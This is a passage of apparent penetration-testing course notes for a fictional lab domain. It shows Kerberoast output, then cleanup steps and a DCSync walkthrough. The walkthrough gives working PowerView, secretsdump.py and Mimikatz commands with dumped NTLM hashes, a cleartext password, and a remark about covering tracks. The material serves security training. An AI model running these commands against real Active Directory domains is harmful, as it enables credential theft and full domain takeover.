[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : adunn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
```

We have successfully obtained the hash. The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the `adunn` user and perform the DCSync attack.

---

## Cleanup

Cleanup steps (in order):
1. Remove the fake SPN from `adunn`
2. Remove `damundsen` from `Help Desk Level 1` group
3. Reset `damundsen`'s password (or have client do it)

The order matters—removing the user from the group first eliminates our rights to remove the fake SPN.

First, **clear the fake SPN** from adunn's Account using `Set-DomainObject`:

```
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
```

Then remove `damundsen` from the group with `Remove-DomainGroupMember`:

```
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
True
```

Verify removal using `Get-DomainGroupMember`:
```
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

**Important:** Document all modifications in your final assessment report. Clients need a complete record of environmental changes, and written documentation protects both parties if questions arise.

This example attack path is fictional but reflects real-world scenarios where ACL attacks enable privilege escalation. In large domains, multiple attack paths exist—some simpler, others more complex. However, ACL attack chains can be time-consuming or risky, so sometimes enumerating the path and providing evidence for client remediation is preferable to exploitation.

---

# DCSync

We now control the `adunn` user who has DCSync privileges in INLANEFREIGHT.LOCAL. Let's explore this attack from both Linux and Windows attack hosts.

**What is DCSync?**

DCSync steals the Active Directory password database by exploiting the built-in `Directory Replication Service Remote Protocol` used by Domain Controllers for replication. Attackers mimic a Domain Controller to retrieve user NTLM password hashes.

The attack requests password replication via the `DS-Replication-Get-Changes-All` extended right, which permits secret data replication. 

**Requirements:** Control of an account with `Replicating Directory Changes` and `Replicating Directory Changes All` permissions. Domain/Enterprise Admins and default domain administrators have these rights by default.

**Viewing adunn's Replication Privileges through ADSI Edit**

<img width="1056" height="528" alt="image" src="https://github.com/user-attachments/assets/2e7e03e7-5b9b-425e-bacc-1d4c1c7f9187" />

It is common during an assessment to find other accounts that have these rights, and once compromised, their access can be utilized to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords. Here we have a standard domain user that has been granted the replicating permissions:

### Using Get-DomainUser to View adunn's Group Membership

```
PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl


samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```

PowerView can be used to confirm the user has the necessary permissions. First, retrieve the user's SID, then use `Get-ObjectAcl` to check ACLs on the domain object (`"DC=inlanefreight,DC=local"`). Search specifically for replication rights and verify if `adunn` (represented as `$sid`) possesses them. The command confirms the user has the required rights.

### Using Get-ObjectAcl to Check adunn's Replication Rights

```
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All
```

If we had certain rights over the user (such as [WriteDacl](https://bloodhound.specterops.io/resources/edges/write-dacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.

Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.

### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

```
$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

<SNIP>

d0wngrade:des-cbc-md5:d6fee0b62aa410fe
d0wngrade:dec-cbc-crc:d6fee0b62aa410fe
ACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d
svc_qualys:des-cbc-md5:f125ab34b53eb61c
forend:des-cbc-md5:e3c14adf9d8a04c1
[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
[*] Cleaning up...
```

The `-just-dc-ntlm` flag extracts only NTLM hashes, while `-just-dc-user <USERNAME>` targets a specific user. Additional useful flags include:

* `-pwd-last-set`: Shows when passwords were last changed
* `-history`: Dumps password history for offline cracking or password strength analysis
* `-user-status`: Checks if users are disabled

Use `-user-status` to filter out disabled accounts when providing password cracking statistics like:
* Number/% of cracked passwords
* Top 10 passwords
* Password length metrics
* Password reuse

This ensures metrics reflect only active domain accounts.

The `-just-dc` flag creates three files: NTLM hashes, Kerberos keys, and cleartext passwords (for accounts with reversible encryption enabled).

### Listing Hashes, Kerberos Keys, and Cleartext Passwords

```
$ ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

While rare, we see accounts with these settings from time to time. It would typically be set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes.

**Viewing an Account with Reversible Encryption Password Storage Set**

<img width="1206" height="605" alt="image" src="https://github.com/user-attachments/assets/860cf688-6ac7-4ea6-847c-3dbaa8d3c4e3" />

When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the Syskey) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the `Get-ADUser` cmdlet:

### Enumerating Further using Get-ADUser

```
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :
```

We can see that one account, `proxyagent`, has the reversible encryption option set with PowerView as well:

### Checking for Reversible Encryption Option using Get-DomainUser

```
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

We will notice the tool decrypted the password and provided us with the cleartext value.

### Displaying the Decrypted Password
```
$ cat inlanefreight_hashes.ntds.cleartext 

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence, but that is outside the scope of this module.

Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this:

### Using runas.exe
```
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

From the newly spawned powershell session, we can perform the attack:

### Performing the Attack with Mimikatz

```
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

<SNIP>
```

---
